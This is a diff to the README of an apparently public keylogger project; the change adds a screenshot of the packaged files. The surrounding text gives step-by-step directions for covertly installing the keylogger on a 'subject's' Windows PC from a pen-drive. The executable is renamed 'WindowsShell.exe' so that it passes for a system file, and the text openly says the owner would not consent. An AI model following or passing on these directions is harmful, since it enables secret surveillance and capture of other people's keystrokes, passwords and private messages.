@@ -6,7 +6,11 @@ This tacky program hides itself in the subject’s PC (Windows XP or later), and
 
 ### How to use?
 
-1. Download the full package from [here](https://github.com/MinhasKamal/KeyLogger/archive/application.zip), unzip it, and move it to your pen-drive.
+1. Download the full package from [here](https://github.com/MinhasKamal/KeyLogger/archive/application.zip), unzip it, and move it to your pen-drive. It should look like this-
+
+<div align="center">
+  <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="Key-Logger"/>
+</div>
 
 2. **WindowsShell.exe** is the compiled and renamed form of **KeyLogger.cpp** (of course you do not expect others to let you insert a pen-drive containing keylogger!). **WindowsShell.lnk** is a link file of **WindowsShell.exe**. Now insert your pen-drive in a computer, and run **---**. This will install **---** and **---** in that PC.
 
